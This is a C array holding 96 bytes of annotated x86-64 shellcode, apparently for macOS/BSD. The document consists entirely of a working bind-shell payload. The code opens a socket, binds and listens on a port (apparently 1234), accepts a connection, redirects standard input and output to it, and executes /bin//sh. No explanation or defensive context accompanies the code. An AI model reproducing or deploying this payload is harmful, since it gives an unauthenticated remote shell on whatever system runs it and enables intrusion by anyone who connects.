
#define BS_SIZE 96

char BS[] = {
  /* 0000 */ "\x48\xb8\xff\xfd\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfdff */
  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 000D */ "\x50"                                     /* push rax                    */
  /* 000E */ "\x31\xed"                                 /* xor ebp, ebp                */
  /* 0010 */ "\x0f\xba\xed\x19"                         /* bts ebp, 0x19               */
  /* 0014 */ "\x55"                                     /* push rbp                    */
  /* 0015 */ "\x58"                                     /* pop rax                     */
  /* 0016 */ "\x99"                                     /* cdq                         */
  /* 0017 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0019 */ "\x5e"                                     /* pop rsi                     */
  /* 001A */ "\x6a\x02"                                 /* push 0x2                    */
  /* 001C */ "\x5f"                                     /* pop rdi                     */
  /* 001D */ "\xb0\x61"                                 /* mov al, 0x61                */
  /* 001F */ "\x0f\x05"                                 /* syscall                     */
  /* 0021 */ "\x97"                                     /* xchg edi, eax               */
  /* 0022 */ "\x55"                                     /* push rbp                    */
  /* 0023 */ "\x58"                                     /* pop rax                     */
  /* 0024 */ "\x54"                                     /* push rsp                    */
  /* 0025 */ "\x5e"                                     /* pop rsi                     */
  /* 0026 */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 0028 */ "\xb0\x68"                                 /* mov al, 0x68                */
  /* 002A */ "\x0f\x05"                                 /* syscall                     */
  /* 002C */ "\x50"                                     /* push rax                    */
  /* 002D */ "\x5e"                                     /* pop rsi                     */
  /* 002E */ "\x55"                                     /* push rbp                    */
  /* 002F */ "\x58"                                     /* pop rax                     */
  /* 0030 */ "\xb0\x6a"                                 /* mov al, 0x6a                */
  /* 0032 */ "\x0f\x05"                                 /* syscall                     */
  /* 0034 */ "\x55"                                     /* push rbp                    */
  /* 0035 */ "\x58"                                     /* pop rax                     */
  /* 0036 */ "\xb0\x1e"                                 /* mov al, 0x1e                */
  /* 0038 */ "\x99"                                     /* cdq                         */
  /* 0039 */ "\x0f\x05"                                 /* syscall                     */
  /* 003B */ "\x97"                                     /* xchg edi, eax               */
  /* 003C */ "\x6a\x02"                                 /* push 0x2                    */
  /* 003E */ "\x5e"                                     /* pop rsi                     */
  /* 003F */ "\x55"                                     /* push rbp                    */
  /* 0040 */ "\x58"                                     /* pop rax                     */
  /* 0041 */ "\xb0\x5a"                                 /* mov al, 0x5a                */
  /* 0043 */ "\x0f\x05"                                 /* syscall                     */
  /* 0045 */ "\xff\xce"                                 /* dec esi                     */
  /* 0047 */ "\x79\xf6"                                 /* jns 0x3f                    */
  /* 0049 */ "\xff\xc6"                                 /* inc esi                     */
  /* 004B */ "\x99"                                     /* cdq                         */
  /* 004C */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rbx, 0x68732f2f6e69622f */
  /* 0056 */ "\x52"                                     /* push rdx                    */
  /* 0057 */ "\x53"                                     /* push rbx                    */
  /* 0058 */ "\x54"                                     /* push rsp                    */
  /* 0059 */ "\x5f"                                     /* pop rdi                     */
  /* 005A */ "\x55"                                     /* push rbp                    */
  /* 005B */ "\x58"                                     /* pop rax                     */
  /* 005C */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 005E */ "\x0f\x05"                                 /* syscall                     */
};